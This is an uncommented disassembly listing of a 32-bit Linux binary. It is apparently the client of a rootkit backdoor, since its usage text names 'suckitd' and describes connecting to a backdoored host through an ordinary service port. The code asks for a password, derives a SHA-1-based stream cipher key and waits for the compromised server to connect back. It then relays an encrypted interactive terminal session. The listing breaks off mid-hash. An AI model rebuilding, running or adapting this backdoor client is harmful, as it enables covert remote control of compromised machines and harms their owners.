jmp 0x804bb15
dec edi
push ebx
inc esi
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
mov eax, section..text
pushal
call fcn.0804c9e0
popal
jmp eax
jmp dword [reloc.__register_frame_info]
jmp dword [reloc.write]
jmp dword [reloc.close]
jmp dword [reloc.perror]
jmp dword [reloc.fprintf]
jmp dword [reloc.fork]
jmp dword [reloc.getenv]
jmp dword [reloc.signal]
jmp dword [reloc.fflush]
jmp dword [reloc.select]
jmp dword [reloc.tcsetattr]
jmp dword [reloc.__errno_location]
jmp dword [reloc.memchr]
jmp dword [reloc.accept]
jmp dword [reloc.inet_ntoa]
jmp dword [reloc.listen]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.time]
jmp dword [reloc.getopt]
jmp dword [reloc.fgets]
jmp dword [reloc.sleep]
jmp dword [reloc.inet_addr]
jmp dword [reloc.__libc_start_main]
jmp dword [reloc.printf]
jmp dword [reloc.bind]
jmp dword [reloc.getsockname]
jmp dword [reloc.srand]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.bzero]
jmp dword [reloc.exit]
jmp dword [reloc.sscanf]
jmp dword [reloc.ioctl]
jmp dword [reloc.connect]
jmp dword [reloc.kill]
jmp dword [reloc.sprintf]
jmp dword [reloc.socket]
jmp dword [reloc.tcgetattr]
jmp dword [reloc.read]
jmp dword [reloc.alarm]
jmp dword [reloc.wait]
jmp dword [reloc.strcpy]
pop ebx
add ebx, 0x4243
cmp dword [ebx + 0xb0], 0
je 0x8048916
call loc.imp.__gmon_start__
mov esi, esi
call fcn.08048c50
call fcn.0804b680
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x8048c6b
push 0x804ccac
push section..eh_frame
call sym.imp.__register_frame_info
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, section..ctors
cmp dword [section..ctors], 0xffffffff
je 0x804b69e
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x804b692
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x5c
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
lea ebx, [var_5ch]
push ebx
call fcn.0804b174
push esi
push edi
push ebx
call fcn.0804b1ac
push ebx
mov eax, dword [arg_10h]
push eax
call fcn.0804b268
lea esp, [var_68h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov dword [eax], 0x67452301
mov dword [eax + 4], 0xefcdab89
mov dword [eax + 8], 0x98badcfe
mov dword [eax + 0xc], 0x10325476
mov dword [eax + 0x10], 0xc3d2e1f0
mov dword [eax + 0x18], 0
mov dword [eax + 0x14], 0
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_10h]
mov esi, dword [arg_8h]
mov eax, dword [esi + 0x14]
mov edi, eax
shr edi, 3
and edi, 0x3f
lea edx, [ebx*8]
add eax, edx
mov dword [esi + 0x14], eax
cmp eax, edx
jae 0x804b1d9
inc dword [esi + 0x18]
mov ecx, ebx
shr ecx, 0x1d
mov esi, dword [arg_8h]
add dword [esi + 0x18], ecx
lea eax, [ebx + edi]
cmp eax, 0x3f
jbe 0x804b240
mov dword [var_4h], 0x40
sub dword [var_4h], edi
lea edi, [esi + edi + 0x1c]
mov ecx, dword [var_4h]
mov esi, dword [arg_ch]
rep movsb byte es:[edi], byte ptr [esi]
mov eax, dword [arg_8h]
add eax, 0x1c
push eax
mov esi, dword [arg_8h]
push esi
call fcn.08049860
add esp, 8
jmp 0x804b22e
mov eax, dword [arg_ch]
add eax, dword [var_4h]
push eax
mov esi, dword [arg_8h]
push esi
call fcn.08049860
add esp, 8
add dword [var_4h], 0x40
mov eax, dword [var_4h]
add eax, 0x3f
cmp eax, ebx
jb 0x804b217
xor edi, edi
jmp 0x804b247
lea esi, [esi]
mov dword [var_4h], 0
sub ebx, dword [var_4h]
mov esi, dword [arg_8h]
lea edi, [esi + edi + 0x1c]
mov eax, dword [var_4h]
add eax, dword [arg_ch]
mov ecx, ebx
mov esi, eax
rep movsb byte es:[edi], byte ptr [esi]
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
push edi
push esi
push ebx
xor ebx, ebx
lea eax, [var_8h]
mov dword [var_10h], eax
mov ecx, dword [arg_ch]
add ecx, 0x14
mov dword [var_ch], ecx
mov dword [var_1ch], ecx
cmp ebx, 3
ja 0x804b291
mov esi, 4
jmp 0x804b293
xor esi, esi
mov dword [var_14h], ebx
and dword [var_14h], 3
mov edx, 3
sub edx, dword [var_14h]
shl edx, 3
mov ecx, dword [var_1ch]
mov esi, dword [esi + ecx]
mov ecx, edx
shr esi, cl
mov dword [var_14h], esi
mov al, byte [var_14h]
mov ecx, dword [var_10h]
mov byte [ebx + ecx], al
inc ebx
cmp ebx, 7
jbe 0x804b285
push 1
push 0x804baf0
mov edi, dword [arg_ch]
push edi
call fcn.0804b1ac
add esp, 0xc
jmp 0x804b2ec
push 1
push 0x804baf2
mov ecx, dword [arg_ch]
push ecx
call fcn.0804b1ac
add esp, 0xc
mov edi, dword [arg_ch]
mov eax, dword [edi + 0x14]
and eax, 0x1f8
cmp eax, 0x1c0
jne 0x804b2d6
push 8
mov ecx, dword [var_10h]
push ecx
mov edi, dword [arg_ch]
push edi
call fcn.0804b1ac
xor ebx, ebx
add esp, 0xc
mov esi, 3
mov dword [var_18h], ebx
and byte [var_18h], 0xfc
mov edx, ebx
and edx, 3
mov dword [var_14h], esi
sub dword [var_14h], edx
mov eax, dword [var_14h]
lea edx, [eax*8]
mov ecx, dword [arg_ch]
mov edi, dword [var_18h]
mov eax, dword [edi + ecx]
mov ecx, edx
shr eax, cl
mov dword [var_14h], eax
mov cl, byte [var_14h]
mov edi, dword [arg_8h]
mov byte [ebx + edi], cl
inc ebx
cmp ebx, 0x13
jbe 0x804b314
mov esi, dword [arg_ch]
add esi, 0x1c
mov ecx, 0x40
mov edi, esi
xor eax, eax
rep stosb byte es:[edi], al
mov ecx, 0x14
mov edi, dword [arg_ch]
rep stosb byte es:[edi], al
mov ecx, 8
mov edi, dword [var_ch]
rep stosb byte es:[edi], al
mov ecx, 8
mov edi, dword [var_10h]
rep stosb byte es:[edi], al
push esi
mov eax, dword [arg_ch]
push eax
call fcn.08049860
lea esp, [var_28h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
push ebx
push 0x14
push dword [arg_10h]
call fcn.0804b390
mov word [ebx + 0x14], si
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push fcn.08048e9c
push 0x1c
call sym.imp.signal
inc dword [0x804cb28]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
mov edx, dword [arg_ch]
mov ecx, 0x14
mov esi, dword [arg_8h]
mov edi, edx
rep movsb byte es:[edi], byte ptr [esi]
mov dword [edx + 0x14], 0
lea esp, [var_8h]
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov esi, dword [arg_8h]
mov edi, dword [arg_ch]
cmp dword [arg_10h], 0
je 0x804b460
mov cl, byte [edi]
mov edx, dword [esi + 0x14]
mov al, byte [edx + esi]
mov byte [var_1h], cl
xor byte [var_1h], al
add al, cl
mov byte [edx + esi], al
mov eax, dword [esi + 0x14]
lea ebx, [eax + 1]
mov dword [esi + 0x14], ebx
cmp eax, 0x13
jne 0x804b455
push esi
push 0x14
push esi
call fcn.0804b390
mov dword [esi + 0x14], 0
add esp, 0xc
mov bl, byte [var_1h]
mov byte [edi], bl
inc edi
dec dword [arg_10h]
jne 0x804b421
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov dword [0x804cb2c], 1
push fcn.08048c80
push 0xe
call sym.imp.signal
push 0x3c
call sym.imp.alarm
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov esi, dword [arg_8h]
mov edi, dword [arg_ch]
cmp dword [arg_10h], 0
je 0x804b4b8
lea esi, [esi]
mov edx, dword [esi + 0x14]
mov al, byte [edx + esi]
mov bl, al
xor bl, byte [edi]
add al, bl
mov byte [edx + esi], al
mov eax, dword [esi + 0x14]
lea ecx, [eax + 1]
mov dword [esi + 0x14], ecx
cmp eax, 0x13
jne 0x804b4b0
push esi
push 0x14
push esi
call fcn.0804b390
mov dword [esi + 0x14], 0
add esp, 0xc
mov byte [edi], bl
inc edi
dec dword [arg_10h]
jne 0x804b480
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push dword [arg_8h]
push str.use:_n_s__hsditc__...args_n_h_tSpecifies_ip_hostname_of_host_where_is_running_n_tsuckitd_n_s_tSpecifies_port_where_we_should_listen_for_incoming_n_tserver_connection__if_some_firewalled_etc___if_not_n_tspecified__well_get_some_from_os_n_d_tSpecifies_port_of_service_we_could_use_for_authentication_n_techo__telnet__ssh__httpd..._is_probably_good_choice_n_i_tInterval_between_request_sends__in_seconds__n_t_tTime_we_will_wait_for_server_before_giving_up__in_seconds__n_c_tConnect_timeout__in_seconds__n
push dword [obj.stderr]
call sym.imp.fprintf
mov eax, 1
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
push edi
push esi
push ebx
mov esi, dword [arg_8h]
mov edi, dword [arg_ch]
push 0x10
lea eax, [s]
push eax
call sym.imp.bzero
push esi
call sym.imp.inet_addr
mov ebx, eax
mov dword [in], ebx
mov byte [edi], 0
add esp, 0xc
cmp ebx, 0xffffffff
jne 0x8048d4b
push esi
call sym.imp.gethostbyname
add esp, 4
test eax, eax
jne 0x8048d41
mov eax, ebx
jmp 0x8048d60
mov eax, dword [eax + 0x10]
mov eax, dword [eax]
mov eax, dword [eax]
mov dword [in], eax
push dword [in]
call sym.imp.inet_ntoa
add esp, 4
push eax
push edi
call sym.imp.strcpy
mov eax, dword [in]
lea esp, [var_1ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x184
push edi
push esi
push ebx
mov eax, dword [arg_ch]
mov word [var_17ah], ax
lea ecx, [var_3ch]
mov dword [var_180h], ecx
push ecx
push 0
call sym.imp.tcgetattr
lea edi, [var_78h]
mov esi, dword [var_180h]
cld
mov ecx, 0xf
rep movsd dword es:[edi], dword ptr [esi]
and byte [var_6ch], 0xf4
and byte [var_77h], 0xeb
lea eax, [var_78h]
push eax
push 2
push 0
call sym.imp.tcsetattr
push str.password:_
push dword [obj.stderr]
call sym.imp.fprintf
push dword [obj.stderr]
call sym.imp.fflush
add esp, 0x20
push dword [obj.stdin]
push 0xff
lea ebx, [s]
push ebx
call sym.imp.fgets
mov ecx, dword [var_180h]
push ecx
push 2
push 0
call sym.imp.tcsetattr
push 0x804cda0
mov edi, ebx
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
mov edx, ecx
not edx
dec edx
push edx
push ebx
call fcn.0804b390
add esp, 0x24
push 0x804cda0
mov eax, dword [arg_8h]
push eax
mov cx, word [var_17ah]
ror cx, 8
movzx eax, cx
push eax
call fcn.0804b3c4
push 0x804b8ed
push dword [obj.stderr]
call sym.imp.fprintf
lea esp, [var_190h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x4108
push edi
push esi
push ebx
mov ebx, dword [arg_ch]
mov dword [ebp - 0x40d4], 0x10
push fcn.08048e54
push 0x11
call sym.imp.signal
lea eax, [ebp - 0x40d4]
push eax
lea eax, [var_10h]
push eax
push ebx
call sym.imp.accept
mov dword [ebp - 0x40e0], eax
push ebx
call sym.imp.close
add esp, 0x18
cmp dword [ebp - 0x40e0], 0
jge 0x8048f16
push str.accept
call sym.imp.perror
mov eax, 1
jmp 0x80493a7
push fcn.08048e60
push 0x11
call sym.imp.signal
push 0xf
push dword [pid]
call sym.imp.kill
push str.Et_voila_nServer_connected._Escape_character_is_K_n
push dword [obj.stderr]
call sym.imp.fprintf
push 0x804cd60
push 0
call sym.imp.tcgetattr
add esp, 0x20
push fcn.08048e6c
push 1
call sym.imp.signal
push fcn.08048e6c
push 2
call sym.imp.signal
push fcn.08048e6c
push 3
call sym.imp.signal
push fcn.08048e6c
push 4
call sym.imp.signal
add esp, 0x20
push fcn.08048e6c
push 6
call sym.imp.signal
push fcn.08048e6c
push 7
call sym.imp.signal
push fcn.08048e6c
push 8
call sym.imp.signal
push fcn.08048e6c
push 0xb
call sym.imp.signal
add esp, 0x20
push fcn.08048e6c
push 0xf
call sym.imp.signal
push fcn.08048e6c
push 0xd
call sym.imp.signal
push fcn.08048e6c
push 0x1d
call sym.imp.signal
push 0
call fcn.08048e9c
mov edi, 0x804cd20
mov esi, 0x804cd60
cld
mov ecx, 0xf
rep movsd dword es:[edi], dword ptr [esi]
and byte [0x804cd2c], 0xf4
and byte [0x804cd21], 0xeb
push 0x804cd20
push 2
push 0
call sym.imp.tcsetattr
add esp, 0x28
lea eax, [var_28h]
mov dword [ebp - 0x40e4], eax
push eax
push 0x804cda0
call fcn.0804b3e8
lea edx, [var_40h]
mov dword [ebp - 0x40e8], edx
push edx
push 0x804cda0
call fcn.0804b3e8
mov byte [ebp - 0x4040], 0
push str.TERM
call sym.imp.getenv
mov ebx, eax
add esp, 0x14
test ebx, ebx
je 0x8049064
push ebx
push str.TERM_s
lea eax, [ebp - 0x4040]
push eax
call sym.imp.sprintf
add esp, 0xc
push 0x40
lea ecx, [ebp - 0x4040]
mov dword [ebp - 0x4100], ecx
mov dword [ebp - 0x40ec], ecx
push ecx
mov eax, dword [ebp - 0x40e4]
push eax
call fcn.0804b40c
push 0x40
mov edx, dword [ebp - 0x4100]
push edx
mov ecx, dword [ebp - 0x40e0]
push ecx
call sym.imp.write
push 0
call fcn.08048c80
mov dword [0x804cb2c], 0
add esp, 0x1c
lea eax, [ebp - 0x40c0]
mov dword [ebp - 0x40f8], eax
mov ebx, dword [ebp - 0x40e0]
shr ebx, 5
mov edx, dword [ebp - 0x40e0]
mov dword [ebp - 0x40fc], edx
and dword [ebp - 0x40fc], 0x1f
inc edx
mov dword [ebp - 0x4104], edx
shl ebx, 2
mov dword [ebp - 0x40f0], ebx
mov dword [ebp - 0x40f4], eax
lea esi, [esi]
mov ecx, 0x20
mov edi, dword [ebp - 0x40f8]
xor eax, eax
cld
rep stosd dword es:[edi], eax
bts dword [ebp - 0x40c0], eax
mov edx, dword [ebp - 0x40f4]
mov dword [ebp - 0x40f8], edx
mov eax, dword [ebp - 0x40fc]
mov ecx, dword [ebp - 0x40f0]
bts dword [ecx + edx], eax
cmp dword [0x804cb28], 0
je 0x80491cd
lea ebx, [ebp - 0x40dc]
push ebx
push 0x5413
push 1
call sym.imp.ioctl
add esp, 0xc
test eax, eax
jne 0x80491c3
mov byte [ebp - 0x40c8], 0xb
mov dx, word [ebx + 2]
shr dx, 8
mov word [ebp - 0x4106], dx
mov cl, byte [ebp - 0x4106]
mov byte [ebp - 0x40c7], cl
mov bl, byte [ebx + 2]
mov byte [ebp - 0x40c6], bl
movzx ax, byte [ebp - 0x40db]
mov word [ebp - 0x4106], ax
mov dl, byte [ebp - 0x4106]
mov byte [ebp - 0x40c5], dl
mov cl, byte [ebp - 0x40dc]
mov byte [ebp - 0x40c4], cl
push 5
lea ebx, [ebp - 0x40c8]
push ebx
mov eax, dword [ebp - 0x40e4]
push eax
call fcn.0804b40c
push 5
push ebx
mov edx, dword [ebp - 0x40e0]
push edx
call sym.imp.write
add esp, 0x18
mov dword [0x804cb28], 0
call sym.imp.__errno_location
mov esi, eax
mov dword [esi], 0
cmp dword [0x804cb2c], 0
je 0x804922c
mov dword [ebp - 0x40d0], 0
mov byte [ebp - 0x40cc], 0
mov byte [ebp - 0x40d0], 0xb
mov dword [0x804cb2c], 0
push 5
lea ebx, [ebp - 0x40d0]
push ebx
mov ecx, dword [ebp - 0x40e4]
push ecx
call fcn.0804b40c
push 5
push ebx
mov eax, dword [ebp - 0x40e0]
push eax
call sym.imp.write
add esp, 0x18
push 0
push 0
push 0
mov edx, dword [ebp - 0x40f4]
push edx
mov ecx, dword [ebp - 0x4104]
push ecx
call sym.imp.select
mov ebx, eax
add esp, 0x14
test ebx, ebx
jge 0x8049260
cmp dword [esi], 4
je 0x80490f0
jmp 0x8049372
lea esi, [esi]
xor eax, eax
bt dword [ebp - 0x40c0], eax
setb al
mov byte [ebp - 0x4106], al
test al, al
je 0x80492f3
mov dword [esi], 0
push 0x4000
mov edx, dword [ebp - 0x40ec]
push edx
push 0
call sym.imp.read
mov ebx, eax
add esp, 0xc
test ebx, ebx
jg 0x80492a1
cmp dword [esi], 4
jne 0x8049372
push ebx
push 0xb
mov ecx, dword [ebp - 0x4100]
push ecx
call sym.imp.memchr
mov edi, eax
add esp, 0xc
test edi, edi
jne 0x8049372
push ebx
mov eax, dword [ebp - 0x4100]
push eax
mov edx, dword [ebp - 0x40e4]
push edx
call fcn.0804b40c
push ebx
mov ecx, dword [ebp - 0x4100]
push ecx
mov eax, dword [ebp - 0x40e0]
push eax
call sym.imp.write
mov ebx, eax
add esp, 0x18
test ebx, ebx
jge 0x80492f3
cmp dword [esi], 4
jne 0x8049372
mov eax, dword [ebp - 0x40fc]
mov edx, dword [ebp - 0x40f4]
mov ecx, dword [ebp - 0x40f0]
bt dword [ecx + edx], eax
setb dl
test dl, dl
je 0x80490f0
call sym.imp.__errno_location
mov edi, eax
mov dword [edi], 0
push 0x4000
mov edx, dword [ebp - 0x40ec]
push edx
mov ecx, dword [ebp - 0x40e0]
push ecx
call sym.imp.read
mov ebx, eax
add esp, 0xc
test ebx, ebx
jg 0x8049347
cmp dword [edi], 4
jne 0x8049372
push ebx
mov eax, dword [ebp - 0x4100]
push eax
mov edx, dword [ebp - 0x40e8]
push edx
call fcn.0804b468
push ebx
mov ecx, dword [ebp - 0x4100]
push ecx
push 1
call sym.imp.write
add esp, 0x18
jmp 0x80490f0
push 0x804cd60
push 2
push 0
call sym.imp.tcsetattr
call sym.imp.__errno_location
mov ebx, eax
push dword [ebx]
push str.Connection_disappeared__errno_d_n
push dword [obj.stderr]
call sym.imp.fprintf
mov eax, dword [ebp - 0x40e0]
push eax
call sym.imp.close
xor eax, eax
lea esp, [ebp - 0x4114]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov dword [0x804cb24], 0
push dword [arg_8h]
call sym.imp.alarm
push fcn.08048ca4
push 0xe
call sym.imp.signal
leave
ret
push ebp
mov ebp, esp
sub esp, 0x15c
push edi
push esi
push ebx
mov dword [var_ch], 0x804cce0
mov ecx, 0x40
mov esi, dword [arg_ch]
mov edi, dword [var_ch]
rep movsb byte es:[edi], byte ptr [esi]
mov ebx, dword [arg_8h]
mov esi, dword [ebx]
mov edi, dword [ebx + 4]
mov dword [var_15ch], edi
mov ecx, dword [ebx + 8]
mov ebx, dword [ebx + 0xc]
mov dword [var_4h], ebx
mov eax, ecx
xor eax, ebx
and eax, edi
xor eax, ebx
add eax, dword [0x804cce0]
mov dword [var_10h], esi
rol dword [var_10h], 5
mov edi, dword [var_10h]
lea eax, [eax + edi + 0x5a827999]
mov ebx, dword [arg_8h]
mov ebx, dword [ebx + 0x10]
add eax, ebx
mov dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
and edx, esi
xor edx, ecx
mov edi, dword [var_ch]
mov edi, dword [edi + 4]
mov dword [var_11ch], edi
add edx, edi
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, esi
xor edx, dword [var_15ch]
and edx, dword [var_8h]
xor edx, dword [var_15ch]
mov ebx, dword [var_ch]
mov ebx, dword [ebx + 8]
mov dword [var_120h], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_8h]
xor edx, esi
and edx, dword [var_4h]
xor edx, esi
mov edi, dword [var_ch]
mov edi, dword [edi + 0xc]
mov dword [var_124h], edi
add edx, edi
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
and edx, ecx
xor edx, dword [var_8h]
mov ebx, dword [var_ch]
mov ebx, dword [ebx + 0x10]
mov dword [var_128h], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add esi, eax
rol ecx, 0x1e
mov edx, ecx
xor edx, dword [var_4h]
and edx, dword [var_15ch]
xor edx, dword [var_4h]
mov edi, dword [var_ch]
mov edi, dword [edi + 0x14]
mov dword [var_12ch], edi
add edx, edi
mov eax, esi
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
and edx, esi
xor edx, ecx
mov ebx, dword [var_ch]
mov ebx, dword [ebx + 0x18]
mov dword [var_130h], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, esi
xor edx, dword [var_15ch]
and edx, dword [var_8h]
xor edx, dword [var_15ch]
mov edi, dword [var_ch]
mov edi, dword [edi + 0x1c]
mov dword [var_134h], edi
add edx, edi
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_8h]
xor edx, esi
and edx, dword [var_4h]
xor edx, esi
mov ebx, dword [var_ch]
mov ebx, dword [ebx + 0x20]
mov dword [var_138h], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
and edx, ecx
xor edx, dword [var_8h]
mov edi, dword [var_ch]
mov edi, dword [edi + 0x24]
mov dword [var_13ch], edi
add edx, edi
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add esi, eax
rol ecx, 0x1e
mov edx, ecx
xor edx, dword [var_4h]
and edx, dword [var_15ch]
xor edx, dword [var_4h]
mov ebx, dword [var_ch]
mov ebx, dword [ebx + 0x28]
mov dword [var_140h], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
and edx, esi
xor edx, ecx
mov edi, dword [var_ch]
mov edi, dword [edi + 0x2c]
mov dword [var_144h], edi
add edx, edi
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, esi
xor edx, dword [var_15ch]
and edx, dword [var_8h]
xor edx, dword [var_15ch]
mov ebx, dword [var_ch]
mov ebx, dword [ebx + 0x30]
mov dword [var_148h], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_8h]
xor edx, esi
and edx, dword [var_4h]
xor edx, esi
mov edi, dword [var_ch]
mov edi, dword [edi + 0x34]
mov dword [var_14ch], edi
add edx, edi
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
and edx, ecx
xor edx, dword [var_8h]
mov ebx, dword [var_ch]
mov ebx, dword [ebx + 0x38]
mov dword [var_150h], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add esi, eax
rol ecx, 0x1e
mov edx, ecx
xor edx, dword [var_4h]
and edx, dword [var_15ch]
xor edx, dword [var_4h]
mov edi, dword [var_ch]
mov edi, dword [edi + 0x3c]
mov dword [var_154h], edi
add edx, edi
mov eax, esi
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
and edx, esi
xor edx, ecx
mov ebx, dword [var_14ch]
mov dword [var_14h], ebx
mov edi, dword [var_138h]
xor dword [var_14h], edi
mov ebx, dword [var_120h]
xor dword [var_14h], ebx
mov edi, dword [0x804cce0]
xor dword [var_14h], edi
rol dword [var_14h], 1
mov ebx, dword [var_14h]
mov dword [0x804cce0], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, esi
xor edx, dword [var_15ch]
and edx, dword [var_8h]
xor edx, dword [var_15ch]
mov edi, dword [var_150h]
mov dword [var_18h], edi
mov ebx, dword [var_13ch]
xor dword [var_18h], ebx
mov edi, dword [var_124h]
xor dword [var_18h], edi
mov ebx, dword [var_11ch]
xor dword [var_18h], ebx
rol dword [var_18h], 1
mov ebx, dword [var_18h]
mov edi, dword [var_ch]
mov dword [edi + 4], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_8h]
xor edx, esi
and edx, dword [var_4h]
xor edx, esi
mov edi, dword [var_154h]
mov dword [var_1ch], edi
mov ebx, dword [var_140h]
xor dword [var_1ch], ebx
mov edi, dword [var_128h]
xor dword [var_1ch], edi
mov ebx, dword [var_120h]
xor dword [var_1ch], ebx
rol dword [var_1ch], 1
mov ebx, dword [var_1ch]
mov edi, dword [var_ch]
mov dword [edi + 8], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
and edx, ecx
xor edx, dword [var_8h]
mov edi, dword [var_14h]
mov dword [var_20h], edi
mov ebx, dword [var_144h]
xor dword [var_20h], ebx
mov edi, dword [var_12ch]
xor dword [var_20h], edi
mov ebx, dword [var_124h]
xor dword [var_20h], ebx
rol dword [var_20h], 1
mov ebx, dword [var_20h]
mov edi, dword [var_ch]
mov dword [edi + 0xc], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x5a827999]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov edi, dword [var_18h]
mov dword [var_24h], edi
mov ebx, dword [var_148h]
xor dword [var_24h], ebx
mov edi, dword [var_130h]
xor dword [var_24h], edi
mov ebx, dword [var_128h]
xor dword [var_24h], ebx
rol dword [var_24h], 1
mov ebx, dword [var_24h]
mov edi, dword [var_ch]
mov dword [edi + 0x10], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov edi, dword [var_1ch]
mov dword [var_28h], edi
mov ebx, dword [var_14ch]
xor dword [var_28h], ebx
mov edi, dword [var_134h]
xor dword [var_28h], edi
mov ebx, dword [var_12ch]
xor dword [var_28h], ebx
rol dword [var_28h], 1
mov ebx, dword [var_28h]
mov edi, dword [var_ch]
mov dword [edi + 0x14], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov edi, dword [var_20h]
mov dword [var_2ch], edi
mov ebx, dword [var_150h]
xor dword [var_2ch], ebx
mov edi, dword [var_138h]
xor dword [var_2ch], edi
mov ebx, dword [var_130h]
xor dword [var_2ch], ebx
rol dword [var_2ch], 1
mov ebx, dword [var_2ch]
mov edi, dword [var_ch]
mov dword [edi + 0x18], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov edi, dword [var_24h]
mov dword [var_30h], edi
mov ebx, dword [var_154h]
xor dword [var_30h], ebx
mov edi, dword [var_13ch]
xor dword [var_30h], edi
mov ebx, dword [var_134h]
xor dword [var_30h], ebx
rol dword [var_30h], 1
mov ebx, dword [var_30h]
mov edi, dword [var_ch]
mov dword [edi + 0x1c], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov edi, dword [var_28h]
mov dword [var_34h], edi
mov ebx, dword [var_14h]
xor dword [var_34h], ebx
mov edi, dword [var_140h]
xor dword [var_34h], edi
mov ebx, dword [var_138h]
xor dword [var_34h], ebx
rol dword [var_34h], 1
mov ebx, dword [var_34h]
mov edi, dword [var_ch]
mov dword [edi + 0x20], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add esi, eax
